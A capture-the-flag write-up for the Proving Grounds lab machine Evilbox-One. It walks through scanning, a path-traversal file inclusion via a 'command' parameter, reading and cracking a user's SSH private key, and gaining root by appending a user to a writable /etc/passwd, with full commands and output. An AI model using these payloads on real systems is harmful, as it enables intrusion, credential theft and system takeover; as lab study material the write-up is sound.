---
layout: default
title: Evilbox-One
parent: Proving Grounds Play
nav_order: 15
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/evilbox-one]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.160.212
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 12:34 EST
Nmap scan report for 192.168.160.212
Host is up (0.057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.75 seconds

```

# Enumeration

---

## 80 | HTTP

Run Gobuster and discover _/secret_ directory.

Run Gobuster again on _/secret_ directory and discover _evil.php_.

This is an empty file.

Run WFUZZ against _/secret/evil.php_ to search for a keyword that will allow LFI exploit.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/sunsetmidnight]
└─$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 0 "http://192.168.160.212/secret/evil.php?FUZZ=../../../../../../../etc/passwd"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.160.212/secret/evil.php?FUZZ=../../../../../../../etc/passwd
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000001218:   200        26 L     38 W       1398 Ch     "command"

Total time: 0
Processed Requests: 1710
Filtered Requests: 1709
Requests/sec.: 0
```

We try the _command_ keyword and trigger LFI by displaying _/etc/passwd_

![lfi](../../../assets/images/ctfs/proving_grounds/evilbox-one/lfi.png)

# Exploitation

---

We have a user _mowree_ and can enumerate the private RSA ssh key from their home directory.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/evilbox-one]
└─$ curl http://192.168.160.212/secret/evil.php?command=../../../../../../../home/mowree/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```

Add the RSA private key to an _id_rsa_ file, change the permissions, and then use to SSH to the target as _mowree_

We are unable to, however, because the system wants a passphrase

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/evilbox-one]
└─$ ssh -i id_rsa mowree@192.168.160.212
The authenticity of host '192.168.160.212 (192.168.160.212)' can't be established.
ED25519 key fingerprint is SHA256:0x3tf1iiGyqlMEM47ZSWSJ4hLBu7FeVaeaT2FxM7iq8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.160.212' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':

```

We need to use _ssh2john_ to crack the passphrase.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/evilbox-one]
└─$ ssh2john id_rsa > crackme

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/evilbox-one]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt crackme
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorn          (id_rsa)
1g 0:00:00:00 DONE (2023-11-09 13:36) 50.00g/s 62400p/s 62400c/s 62400C/s franklin..shirley
Use the "--show" option to display all of the cracked passwords reliably
Session completed.


```

We have cracked the passphrase unicorn
{: .warn}

We get the passphrase _unicorn_ and can SSH as mowree.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/evilbox-one]
└─$ ssh -i id_rsa mowree@192.168.160.212
Enter passphrase for key 'id_rsa':
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
mowree@EvilBoxOne:~$ id
uid=1000(mowree) gid=1000(mowree) grupos=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

```

# Post-Exploitation

---

_/etc/passwd_ is writable and we can add a new user.

The following will add a root user with the password _i<3hacking_

```bash
echo 'kamino:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:kamino:/home/kamino:/bin/bash' >> /etc/passwd

mowree@EvilBoxOne:~$ echo 'kamino:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:kamino:/home/kamino:/bin/bash' >> /etc/passwd

mowree@EvilBoxOne:~$ su kamino
Contraseña:
root@EvilBoxOne:/home/mowree# id
uid=0(root) gid=0(root) grupos=0(root)

```
